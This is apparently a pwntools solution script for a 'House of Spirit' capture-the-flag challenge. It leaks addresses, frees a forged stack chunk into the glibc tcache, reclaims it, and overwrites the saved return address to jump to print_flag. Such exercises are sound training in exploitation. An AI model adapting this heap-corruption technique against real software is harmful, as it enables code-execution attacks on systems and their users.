#!/usr/bin/env python3
"""
working_solve.py - House of Spirit CTF solution

Compatible with any build / glibc version (2.32+).
The exploit calculates ALL offsets at runtime from the debug leak —
no hardcoded stack offsets that break across compiler versions.

Requires:
  - hos_challenge binary (compiled with -no-pie -fno-stack-protector -O2)
  - flag.txt in the same directory
  - pwntools  (pip install pwntools)

For glibc 2.42 patching (run once after compiling):
  patchelf --set-interpreter ./ld-linux-x86-64.so.2 \
           --replace-needed libc.so.6 ./libc.so.6 ./hos_challenge

Attack chain:
  1. Debug info  -> leak fake_addr, flag_addr, ret_addr_location (all printed) normally, u need string %p %s
  2. Add item    -> real heap alloc, size 416 (matches 0x1b1 tcache bin)
  3. Adv. edit   -> redirect item's data ptr to fake_addr (stack)
  4. Delete item -> free(fake_addr) -> House of Spirit into tcache
  5. Add item    -> malloc(416) pops fake_addr from tcache -> we own the stack
  6. Edit item   -> write padding up to ret_addr_location, then p64(flag_addr)
  7. Exit        -> main returns -> jumps to print_flag() -> flag!

Safe-linking (glibc 2.32+) note:
  Safe-linking mangles the *next* pointer stored inside freed tcache chunks.
  It does NOT affect what malloc() returns - we still get fake_addr back
  cleanly as the usable data pointer.
"""

from pwn import *
import re

context.binary = './hos_challenge'
context.log_level = 'info'

# Size must fall within the 0x1b1 tcache bin (chunk body = 0x1b0 = 432 bytes).
# add_item does fgets(data, size) so size-1 bytes are writable.
ALLOC_SIZE = 416   # 0x1a0 — fits in 0x1b0 bin, gives 415 writable bytes


def exploit():
    p = process('./hos_challenge')
    print("=== House of Spirit CTF Challenge ===")

    # ── Step 1: leak all needed addresses ─────────────────────────────────
    print("[*] Step 1: Leaking addresses...")
    p.recvuntil(b'> ')
    p.sendline(b'5')
    dbg = p.recvuntil(b'> ').decode()

    fake_addr = int(re.search(r'Main fake chunk: (0x[0-9a-f]+)', dbg).group(1), 16)
    flag_addr = int(re.search(r'print_flag function: (0x[0-9a-f]+)', dbg).group(1), 16)
    ret_addr  = int(re.search(r'Return address location: (0x[0-9a-f]+)', dbg).group(1), 16)

    # Runtime offset: how far into our malloc'd buffer the saved RIP lives.
    # Calculated fresh each run - immune to compiler/optimization differences.
    ret_offset = ret_addr - fake_addr

    print(f"    fake chunk @ {hex(fake_addr)}")
    print(f"    print_flag @ {hex(flag_addr)}")
    print(f"    saved  RIP @ {hex(ret_addr)}  (offset +{ret_offset} from fake_addr)")

    if ret_offset >= ALLOC_SIZE:
        print(f"[!] ret_offset ({ret_offset}) >= ALLOC_SIZE ({ALLOC_SIZE}) — increase ALLOC_SIZE")
        p.close()
        return

    # ── Step 2: allocate victim item ──────────────────────────────────────
    print("[*] Step 2: Creating victim item...")
    p.sendline(b'1')
    p.sendlineafter(b'Size: ', str(ALLOC_SIZE).encode())
    p.sendlineafter(b'Data: ', b'victim')
    p.recvuntil(b'> ')

    # ── Step 3: redirect data pointer to stack fake chunk ─────────────────
    print("[*] Step 3: Redirecting data pointer to stack fake chunk...")
    p.sendline(b'6')
    p.sendlineafter(b'Index: ', b'0')
    p.sendlineafter(b'New data pointer (hex): ', hex(fake_addr)[2:].encode())
    p.recvuntil(b'> ')

    # ── Step 4: free(fake_addr) — House of Spirit ─────────────────────────
    print("[*] Step 4: House of Spirit — free()ing stack address into tcache...")
    p.sendline(b'4')
    p.sendlineafter(b'Index: ', b'0')
    p.recvuntil(b'> ')

    # ── Step 5: malloc reclaims the stack chunk ────────────────────────────
    print("[*] Step 5: Reclaiming stack chunk via malloc...")
    payload = b'A' * ret_offset + p64(flag_addr)
    p.sendline(b'1')
    p.sendlineafter(b'Size: ', str(ALLOC_SIZE).encode())
    p.sendlineafter(b'Data: ', payload)
    p.recvuntil(b'> ')

    # ── Step 6: exit -> main ret -> print_flag ─────────────────────────────
    print("[*] Step 6: Triggering — sending exit...")
    p.sendline(b'7')

    try:
        output = p.recvall(timeout=4).decode(errors='replace')
        if 'flag{' in output.lower() or 'FLAG{' in output or 'Congratulations' in output:
            print("\n[+] SUCCESS! Flag captured:")
            for line in output.splitlines():
                if line.strip():
                    print(f"    {line}")
        else:
            print("[-] No flag found. Output:")
            print(output)
    except Exception as e:
        print(f"[-] recvall error: {e}")


if __name__ == '__main__':
    exploit()